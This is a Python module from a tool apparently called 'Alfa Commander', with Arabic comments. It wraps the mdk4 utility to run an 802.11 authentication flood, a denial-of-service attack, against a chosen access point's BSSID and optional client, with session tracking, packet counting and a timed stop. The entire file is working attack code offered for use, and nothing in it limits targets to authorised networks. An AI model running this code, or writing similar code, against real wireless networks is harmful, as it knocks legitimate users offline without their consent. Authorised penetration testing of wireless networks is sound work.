# ============================================================
# Alfa Commander - Auth Flood Attack
# هجوم إغراق المصادقة
# ============================================================

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from typing import Callable, Optional

from app.constants import AttackState
from app.core.tools import mdk4
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


@dataclass
class AuthFloodSession:
    session_id: str
    bssid: str
    client: Optional[str] = None
    state: str = AttackState.IDLE
    started_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None
    auth_sent: int = 0
    log: list[str] = field(default_factory=list)
    error: Optional[str] = None


class AuthFloodAttack:
    def __init__(
        self,
        interface: str,
        bssid: str,
        client: Optional[str] = None,
        on_event: Optional[Callable[[str, dict], None]] = None,
    ):
        self.interface = interface
        self.bssid = normalize_mac(bssid)
        self.client = normalize_mac(client) if client else None
        self.on_event = on_event

        self.session = AuthFloodSession(
            session_id=f"auth_{int(datetime.now().timestamp())}",
            bssid=self.bssid,
            client=self.client,
        )
        self._process: Optional[mdk4.StreamingProcess] = None

    async def start(self) -> AuthFloodSession:
        self.session.state = AttackState.RUNNING
        self.session.started_at = datetime.now()

        opts = mdk4.AuthFloodOptions(
            interface=self.interface,
            bssid=self.bssid,
            client=self.client,
        )

        self._process = mdk4.MDK4.auth_flood(opts)
        self._process.on_stdout = self._handle_line
        self._process.on_stderr = self._handle_line
        self._process.on_exit = self._handle_exit

        await self._process.start()

        self._emit("started", {
            "session_id": self.session.session_id,
            "bssid": self.bssid,
        })

        logger.info(f"بدء Auth Flood على {self.bssid}")
        return self.session

    async def stop(self) -> AuthFloodSession:
        if self._process and self._process.running:
            await self._process.stop()
        self.session.state = AttackState.CANCELLED
        self.session.finished_at = datetime.now()
        return self.session

    def _handle_line(self, line: str):
        if not line:
            return
        self.session.log.append(line)
        if "Auth" in line or "sending" in line.lower():
            self.session.auth_sent += 1

    def _handle_exit(self, rc: int):
        if self.session.state == AttackState.RUNNING:
            if rc == 0 or self.session.auth_sent > 0:
                self.session.state = AttackState.SUCCESS
            else:
                self.session.state = AttackState.FAILED
                self.session.error = f"mdk4 انتهى برمز {rc}"

        self.session.finished_at = datetime.now()
        self._emit("finished", {
            "session_id": self.session.session_id,
            "auth_sent": self.session.auth_sent,
        })

    def _emit(self, event: str, data: dict):
        if self.on_event:
            try:
                self.on_event(event, data)
            except Exception:
                pass


async def auth_flood(
    interface: str,
    bssid: str,
    duration: Optional[int] = None,
) -> AuthFloodSession:
    attack = AuthFloodAttack(interface=interface, bssid=bssid)
    session = await attack.start()
    if duration:
        import asyncio
        await asyncio.sleep(duration)
        session = await attack.stop()
    return session
